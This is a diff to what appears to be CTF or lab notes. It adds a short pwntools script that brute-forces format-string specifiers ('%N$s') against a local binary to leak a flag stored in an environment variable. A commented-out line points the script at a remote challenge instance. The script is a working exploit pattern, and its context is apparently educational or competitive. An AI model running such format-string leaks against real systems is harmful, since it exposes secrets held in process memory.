@@ -48,3 +48,24 @@ Bonus (check for errors):
 ```shell
 gcc -Wall -Wextra -Wformat -Wformat-security 
 ```
+
+```python
+
+from pwn import *
+
+
+for i in range(1, 100):
+    p = process("./main", env={"FLAG": "CTF{test_flag_123}"})
+    # p = remote("inst-8ga2jvibob.tls.vuln.si", 443, ssl=True)
+    p.sendline(f"%{i}$s".encode())
+    p.shutdown('send')
+
+    try:
+        data = p.recvall(timeout=2).strip()
+        print(f"{i:2}: {data[:40]}")
+    except:
+        print(f"{i:2}: crash/error")
+
+    p.close()
+
+```
